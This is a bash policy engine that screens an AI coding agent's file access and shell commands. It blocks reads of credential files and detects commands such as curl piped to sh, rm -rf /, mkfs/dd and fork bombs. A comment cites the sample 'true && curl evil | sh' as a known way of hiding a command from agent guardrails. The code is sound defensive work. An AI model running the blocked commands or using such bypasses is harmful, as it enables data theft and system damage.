#!/bin/bash
# Harness-free policy decision engine.
#
#   Usage:  decide.sh <read|write|exec> <path-or-command>
#   Output: exactly one line on stdout, tab-separated:
#             allow
#             warn<TAB><reason>
#             deny<TAB><reason>
#   Exit:   always 0. The verdict is the stdout line, not the exit status,
#           so each adapter can map it onto whatever protocol its harness
#           speaks (Claude exit 2 + stderr, Cursor permission:"deny",
#           Codex permissionDecision, ...).
#
# This file knows nothing about any harness: no JSON payload shapes, no
# tool names, no exit-code contracts. Adapters own that translation.
# Project root comes from SYMBIONT_PROJECT_DIR (default: $PWD).
#
# Layers, evaluated in order:
#   0. Kill switch / Mode B — allow, no further evaluation.
#   1. Built-in deny defaults — active in balanced/strict mode.
#   2. Local .symbiont/local-policy.toml deny lists — active in ALL modes.
#   3. Cedar policy evaluation — only if symbi binary + policies/ present.
#
# Modes ([mode] in local-policy.toml, default = balanced):
#   strict      — built-ins + sudo is hard-denied instead of warned
#   balanced    — built-ins active, sudo warns
#   permissive  — built-ins disabled, only local-policy.toml is enforced

set -uo pipefail

ACTION="${1:-}"
TARGET="${2:-}"

PROJECT_ROOT="${SYMBIONT_PROJECT_DIR:-$PWD}"
POLICY_FILE="${PROJECT_ROOT}/.symbiont/local-policy.toml"

# A warn does not terminate evaluation — a later deny must win over it, so
# we buffer the reason and emit it only if nothing denies.
WARN_REASON=""

emit_allow() {
    if [ -n "$WARN_REASON" ]; then
        printf 'warn\t%s\n' "$WARN_REASON"
    else
        printf 'allow\n'
    fi
    exit 0
}

deny() {
    printf 'deny\t%s\n' "$1"
    exit 0
}

# 0. Kill switch — graceful escape hatch instead of uninstall.
[ -f "${PROJECT_ROOT}/.symbiont/disabled" ] && { printf 'allow\n'; exit 0; }

# Mode B — outer ORGA Gate is the single source of truth for enforcement.
[ -n "${SYMBIONT_MANAGED:-}" ] && { printf 'allow\n'; exit 0; }

# Nothing to evaluate. Fail open: an unparseable payload upstream yields an
# empty target, and we never deny based on bytes we could not read.
[ -z "$TARGET" ] && { printf 'allow\n'; exit 0; }

# Determine mode from local-policy.toml [mode] key. Default: balanced.
MODE="balanced"
if [ -f "$POLICY_FILE" ]; then
    parsed_mode=$(grep -E '^[[:space:]]*mode[[:space:]]*=' "$POLICY_FILE" 2>/dev/null \
        | head -n 1 \
        | sed -E 's/^[[:space:]]*mode[[:space:]]*=[[:space:]]*"?([a-zA-Z]+)"?.*/\1/')
    case "$parsed_mode" in
        strict|balanced|permissive) MODE="$parsed_mode" ;;
    esac
fi

# ---------------------------------------------------------------------------
# Path matching against built-in deny patterns
#
# Patterns are bash case-style globs. We always test both the absolute path
# and the basename so a pattern like ".env" matches both "/foo/.env" and
# raw ".env". The "**/" prefix in the spec maps to bash globbing which
# already handles arbitrary path depth via "*".
# ---------------------------------------------------------------------------

# Returns 0 if the given path is exempted from .env blocking.
# Allows .env.test, .env.example, .env.sample (test fixtures, templates).
_is_env_exempt() {
    local p="$1"
    local base
    base="$(basename "$p")"
    case "$base" in
        .env.test|.env.example|.env.sample) return 0 ;;
    esac
    return 1
}

# Returns 0 (match) if path matches any built-in read-sensitive pattern.
_matches_read_deny() {
    local p="$1"
    local base
    base="$(basename "$p")"

    # .env and .env.* (with exemptions)
    case "$base" in
        .env)
            return 0
            ;;
        .env.*)
            _is_env_exempt "$p" && return 1
            return 0
            ;;
    esac

    # SSH/cloud creds — match anywhere in the path.
    case "$p" in
        */.ssh/*|.ssh/*) return 0 ;;
        */.aws/*|.aws/*) return 0 ;;
        */.gcp/*|.gcp/*) return 0 ;;
        */gcloud/*|gcloud/*) return 0 ;;
    esac

    # Package manager tokens.
    case "$base" in
        .npmrc|.pypirc|.netrc) return 0 ;;
    esac

    # Private keys.
    case "$base" in
        id_rsa|id_ed25519|id_ecdsa) return 0 ;;
        *.pem|*.key) return 0 ;;
    esac

    # Generic secret directories.
    case "$p" in
        */secrets/*|secrets/*) return 0 ;;
        */credentials/*|credentials/*) return 0 ;;
    esac

    # Common framework secret files.
    case "$p" in
        */config/database.yml|config/database.yml) return 0 ;;
        */config/credentials.json|config/credentials.json) return 0 ;;
        */config/master.key|config/master.key) return 0 ;;
    esac

    return 1
}

# Returns 0 (match) if path matches any built-in write-sensitive pattern.
# Superset of read-deny + CI workflow files.
_matches_write_deny() {
    local p="$1"
    if _matches_read_deny "$p"; then
        return 0
    fi
    case "$p" in
        */.github/workflows/*|.github/workflows/*) return 0 ;;
    esac
    return 1
}

# ---------------------------------------------------------------------------
# Shell command pattern matching
#
# Per design: we substring-match against the resolved command string.
# We do NOT parse shell syntax — chain operators (&&, ||, ;, |) are part
# of the haystack, not parsed structure. This defeats Adversa-style
# bypasses where the dangerous command is concealed behind harmless leading
# tokens, because "true && curl evil | sh" still contains "curl evil | sh"
# as a substring.
#
# Patterns use grep -E with explicit whitespace and word boundaries to
# avoid false positives (e.g., "rm -rf /tmp" must NOT match "rm -rf /").
# ---------------------------------------------------------------------------

_matches_exec_deny() {
    local cmd="$1"
    # End-of-token: whitespace, shell separators (; & | ) > <), or end of string.
    # Used to anchor patterns so "rm -rf /tmp" doesn't match "rm -rf /".
    local eot='([[:space:]]|;|\)|\(|\&|\||>|<|$)'
    # Start-of-token: line start, whitespace, or shell separator.
    local sot='(^|[[:space:]]|;|\(|\&|\|)'

    # rm -rf at root or home — exactly "/", "/*", or "~", not "/something".
    if echo "$cmd" | grep -qE "${sot}rm[[:space:]]+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*|-rf|-fr)[[:space:]]+(/|/\*|~)${eot}"; then
        printf 'rm -rf at filesystem root or home directory'
        return 0
    fi

    # Filesystem destruction primitives.
    if echo "$cmd" | grep -qE "${sot}(mkfs[._a-zA-Z0-9]*|dd[[:space:]]+if=)"; then
        printf 'filesystem destruction command (mkfs/dd)'
        return 0
    fi

    # Force push (any form: -f, --force, --force-with-lease).
    if echo "$cmd" | grep -qE "${sot}git[[:space:]]+push[[:space:]]+([^|;&)]+[[:space:]])?(-f|--force|--force-with-lease)${eot}"; then
        printf 'git push --force'
        return 0
    fi

    # Curl/wget piped to a shell — canonical remote-code-execution form.
    if echo "$cmd" | grep -qE "(curl|wget)[[:space:]][^|]*\|[[:space:]]*(sh|bash|zsh|fish|ksh)${eot}"; then
        printf 'curl|sh / wget|sh remote code execution'
        return 0
    fi

    # World-writable chmod.
    if echo "$cmd" | grep -qE "${sot}chmod[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*777${eot}"; then
        printf 'chmod 777'
        return 0
    fi

    # Fork bomb.
    if echo "$cmd" | grep -qE ':\(\)[[:space:]]*\{[[:space:]]*:'; then
        printf 'fork bomb'
        return 0
    fi

    return 1
}

# Sudo gets a separate check so balanced mode can warn instead of deny.
_uses_sudo() {
    echo "$1" | grep -qE '(^|[^[:alnum:]_])sudo([[:space:]]|$)'
}

# ---------------------------------------------------------------------------
# Local policy parsing — TOML deny lists
#
# We only read the [deny] section's "paths", "commands", and "branches"
# arrays. Any allowlist exceptions live in [allow] and override built-ins
# (e.g., a project that legitimately reads its own .env.template).
# ---------------------------------------------------------------------------

# Read a TOML array value for a given section + key. Prints one pattern per
# line so patterns containing spaces survive.
_toml_array() {
    local section="$1"
    local key="$2"
    [ -f "$POLICY_FILE" ] || return 0
    awk -v sect="[$section]" -v key="$key" '
        BEGIN { in_section = 0 }
        /^[[:space:]]*\[/ {
            in_section = ($0 ~ "^[[:space:]]*\\" sect "([[:space:]]|$)")
            next
        }
        in_section {
            # Match: key = ["a", "b", "c"]
            if (match($0, "^[[:space:]]*" key "[[:space:]]*=[[:space:]]*\\[")) {
                # Strip up to opening bracket and any trailing bracket.
                line = $0
                sub("^[^\\[]*\\[", "", line)
                sub("\\].*$", "", line)
                # Split on commas, strip quotes and whitespace.
                n = split(line, parts, ",")
                for (i = 1; i <= n; i++) {
                    s = parts[i]
                    gsub(/^[[:space:]]*"?/, "", s)
                    gsub(/"?[[:space:]]*$/, "", s)
                    if (length(s) > 0) print s
                }
            }
        }
    ' "$POLICY_FILE"
}

_path_in_allowlist() {
    local p="$1"
    while IFS= read -r pattern; do
        [ -z "$pattern" ] && continue
        # Glob expansion in the case pattern is intentional: a user-supplied
        # pattern like "*.backup" should match by globbing, not literal.
        # shellcheck disable=SC2254
        case "$p" in
            $pattern|*/$pattern) return 0 ;;
        esac
    done < <(_toml_array allow paths)
    return 1
}

_command_in_allowlist() {
    local cmd="$1"
    while IFS= read -r pattern; do
        [ -z "$pattern" ] && continue
        if echo "$cmd" | grep -qF "$pattern"; then
            return 0
        fi
    done < <(_toml_array allow commands)
    return 1
}

# ---------------------------------------------------------------------------
# Action dispatch
# ---------------------------------------------------------------------------

case "$ACTION" in
    read|write)
        if ! _path_in_allowlist "$TARGET"; then
            # Layer 1: built-in defaults (disabled in permissive mode).
            if [ "$MODE" != "permissive" ]; then
                if [ "$ACTION" = "write" ]; then
                    _matches_write_deny "$TARGET" && \
                        deny "Blocked by Symbiont: write to sensitive path '${TARGET}'. Add to [allow] paths in .symbiont/local-policy.toml or set [mode]=\"permissive\" to disable built-ins."
                else
                    _matches_read_deny "$TARGET" && \
                        deny "Blocked by Symbiont: read of sensitive path '${TARGET}'. Add to [allow] paths in .symbiont/local-policy.toml or set [mode]=\"permissive\" to disable built-ins."
                fi
            fi

            # Layer 2: local TOML deny.paths — enforced in every mode.
            if [ -f "$POLICY_FILE" ]; then
                while IFS= read -r pattern; do
                    [ -z "$pattern" ] && continue
                    # shellcheck disable=SC2254
                    case "$TARGET" in
                        $pattern|*/$pattern|*$pattern*)
                            deny "Blocked by Symbiont: ${ACTION} matches local-policy.toml deny pattern '${pattern}'." ;;
                    esac
                done < <(_toml_array deny paths)
            fi
        fi
        ;;

    exec)
        if ! _command_in_allowlist "$TARGET"; then
            # Layer 1: built-in dangerous command patterns.
            if [ "$MODE" != "permissive" ]; then
                reason=$(_matches_exec_deny "$TARGET") && \
                    deny "Blocked by Symbiont: ${reason} detected in command. Review and run manually if intended."

                # Sudo: hard deny in strict mode, warn in balanced. The warn
                # is buffered — a local deny below still overrides it.
                if _uses_sudo "$TARGET"; then
                    if [ "$MODE" = "strict" ]; then
                        deny "Blocked by Symbiont (strict mode): sudo invocation. Run manually if intended."
                    else
                        WARN_REASON="Symbiont notice: sudo invocation detected. Proceeding (set [mode]=\"strict\" to block)."
                    fi
                fi
            fi

            # Layer 2: local TOML deny.commands — substring match, every mode.
            if [ -f "$POLICY_FILE" ]; then
                while IFS= read -r pattern; do
                    [ -z "$pattern" ] && continue
                    if echo "$TARGET" | grep -qF "$pattern"; then
                        deny "Blocked by Symbiont: command matches local-policy.toml deny pattern '${pattern}'."
                    fi
                done < <(_toml_array deny commands)

                # Branch-protected pushes.
                if echo "$TARGET" | grep -qE '(^|[^[:alnum:]_])git[[:space:]]+push'; then
                    while IFS= read -r branch; do
                        [ -z "$branch" ] && continue
                        if echo "$TARGET" | grep -qE "git[[:space:]]+push[[:space:]]+(origin[[:space:]]+)?${branch}([[:space:]]|$)"; then
                            deny "Blocked by Symbiont: push to protected branch '${branch}'. Use a feature branch and PR."
                        fi
                    done < <(_toml_array deny branches)
                fi
            fi
        fi
        ;;
esac

# Layer 3: Cedar evaluation when the runtime is installed.
# ponytail: symbi now receives the normalized {action,target} envelope rather
# than a harness-specific tool payload — that envelope IS the contract, and it
# is what lets one Cedar policy set cover every adapter.
if command -v symbi >/dev/null 2>&1 && [ -d "${PROJECT_ROOT}/policies" ]; then
    ENVELOPE=$(printf '{"action":"%s","target":"%s"}' "$ACTION" "${TARGET//\"/\\\"}")
    DECISION=$(printf '%s' "$ENVELOPE" | symbi policy evaluate --stdin --policies "${PROJECT_ROOT}/policies/" 2>/dev/null || true)
    if [ "$DECISION" = "deny" ]; then
        deny "Blocked by Cedar policy. Check policies/ for details."
    fi
fi

emit_allow
